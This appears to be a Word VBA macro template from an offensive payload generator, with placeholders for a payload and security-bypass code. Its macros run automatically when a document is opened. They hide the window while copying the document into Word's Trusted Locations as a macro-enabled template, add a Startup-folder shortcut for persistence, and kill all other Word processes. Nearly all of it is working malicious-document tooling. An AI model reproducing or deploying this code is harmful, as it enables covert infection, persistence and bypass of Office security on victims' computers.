{{payloadCode}}


{{bypassCode}}


{{moduleCode}}


Sub AutoNew()
       
   Application.OnTime Now + TimeValue("00:00:02"), "AutoRun"
    
End Sub

Sub AutoRun()
	
	InstallShortcut
    
    If Application.Documents.Count = 1 Then
        Documents.Add NewTemplate:=False, DocumentType:=wdNewBlankDocument, Visible:=True
    End If
	
	SingleInstance
	
	{{payload_function}}
	
End Sub


Sub AutoExec()
       
    If ThisDocument.Name = "{{template}}" Then
        If Application.Documents.Count = 0 Then
            Documents.Add Template:=ThisDocument.FullName, NewTemplate:=False, DocumentType:=wdNewBlankDocument, Visible:=False
        End If
    End If
        
End Sub


Sub AutoOpen()
       
    On Error Resume Next
    
    Dim szCurrentFileName As String
    Dim szTargetFileName As String
    Dim oDocCopy As Document
    Dim oDocCurrent As Document
    Dim lpExpandedStringBytes() As Byte
    Dim nExpandedStringSize As Long: nExpandedStringSize = 260

    {{bypassCalls}}
	
    {{moduleCalls}}

    If ActiveDocument.Name <> "{{template}}" Then
    
        szCurrentFileName = ActiveDocument.FullName

        If GetRegStringExpandValue(HKEY_CURRENT_USER, "Software\Microsoft\Office\" & Application.Version & "\Word\Security\Trusted Locations\Location2", "Path", szTargetFileName) = False Then Exit Sub
    
        ReDim lpExpandedStringBytes(nExpandedStringSize)
        nExpandedStringSize = m_ExpandEnvironmentStrings(szTargetFileName, lpExpandedStringBytes(LBound(lpExpandedStringBytes)), nExpandedStringSize)
        If nExpandedStringSize = 0 Then Exit Sub
        ReDim Preserve lpExpandedStringBytes(nExpandedStringSize - 1 - 1) As Byte
        
        szTargetFileName = StrConv(lpExpandedStringBytes, vbUnicode) & Application.PathSeparator & "{{template}}"

        If Dir(szTargetFileName) = "" Then
        
            Dim wndState As WdWindowState
            Dim wndTop As Long
            Dim wndLeft As Long
            
            wndState = ActiveWindow.WindowState
            wndTop = ActiveWindow.Top
            wndLeft = ActiveWindow.Left

            ActiveDocument.ActiveWindow.Visible = False
            
            ActiveDocument.SaveAs2 FileName:=szTargetFileName, FileFormat:=wdFormatXMLTemplateMacroEnabled, AddToRecentFiles:=False

            Set oDocCopy = Documents.Open(FileName:=szCurrentFileName, Visible:=True)

            oDocCopy.Activate
            
            ActiveDocument.ActiveWindow.Visible = True
            
            Application.ActiveWindow.WindowState = wndState
            Application.Move Top:=wndTop, Left:=wndLeft

            Documents.Add Template:=szTargetFileName, NewTemplate:=False, DocumentType:=wdNewBlankDocument, Visible:=False
            
            Application.Documents("{{template}}").Close
            
        End If
         
    End If
        
End Sub


Sub InstallShortcut()

    Dim szExecutablePathName As String
    Dim szPersistenceFullPathName As String
    Dim szPersistencePathName As String
    Dim objWscriptShell As Object
    Dim objCreateShortcut As Object

    szExecutablePathName = Chr(34) & Application.Path & Application.PathSeparator & "WINWORD.EXE" & Chr(34)
    szPersistencePathName = Environ("APPDATA") & "\Microsoft\Windows\Start Menu\Programs\Startup"
    szPersistenceFullPathName = szPersistencePathName & Application.PathSeparator & Application.Name & ".lnk"
        
    If Dir(szPersistenceFullPathName) = "" Then
        Set objWscriptShell = CreateObject("WScript.Shell")
        Set objCreateShortcut = objWscriptShell.CreateShortcut(szPersistenceFullPathName)
        With objCreateShortcut
            .TargetPath = szExecutablePathName
            .Description = Application.Name
            .RelativePath = szPersistencePathName
            .Save
        End With
        Set objCreateShortcut = Nothing
        Set objWscriptShell = Nothing
        
    End If
    
End Sub


Sub SingleInstance()

    Dim dwPid As Long
    
    Dim oServices As Object
    Dim oProcessSet As Object
    Dim oProcess As Object
    
    dwPid = m_GetCurrentProcessId()

    Set oServices = GetObject("winmgmts:\\.\root\CIMV2")
    Set oProcessSet = oServices.ExecQuery("SELECT ProcessID, Name FROM Win32_Process WHERE name = """ & "WINWORD.EXE" & """", , 48)

    For Each oProcess In oProcessSet
        If oProcess.ProcessID <> dwPid Then
            oProcess.Terminate
        End If
    Next

    Set oProcessSet = Nothing
    Set oServices = Nothing
    
End Sub



Public Function GetRegStringExpandValue(ByVal hKey As LongPtr, ByVal lpSubKey As String, ByVal lpValueName As String, ByRef lpData As String) As Boolean

    Dim hSubKey As LongPtr
    Dim dwSamDesired As Long
    Dim ulOptions As Long
    Dim lpReserved As LongPtr
    Dim lpType As Long
    
    Dim lpDataBytes() As Byte
    Dim cbDataBytes As Long
    Dim dwCurrentByte As Long

    dwSamDesired = KEY_READ
    ulOptions = 0
    lpReserved = 0
    cbDataBytes = 0
    GetRegStringExpandValue = False

    If m_RegOpenKeyEx(hKey, lpSubKey, ulOptions, dwSamDesired, hSubKey) = 0 Then
        If m_RegQueryValueEx(hSubKey, lpValueName, lpReserved, lpType, ByVal 0&, cbDataBytes) = 0 Then
            ReDim lpDataBytes(cbDataBytes) As Byte
            If m_RegQueryValueEx(hSubKey, lpValueName, lpReserved, lpType, lpDataBytes(LBound(lpDataBytes)), cbDataBytes) = 0 Then
                GetRegStringExpandValue = True
                ReDim Preserve lpDataBytes(cbDataBytes - 1 - 1) As Byte
                lpData = StrConv(lpDataBytes, vbUnicode)
            End If
        End If
    End If

    If hSubKey <> 0 Then m_RegCloseKey hSubKey
    
End Function

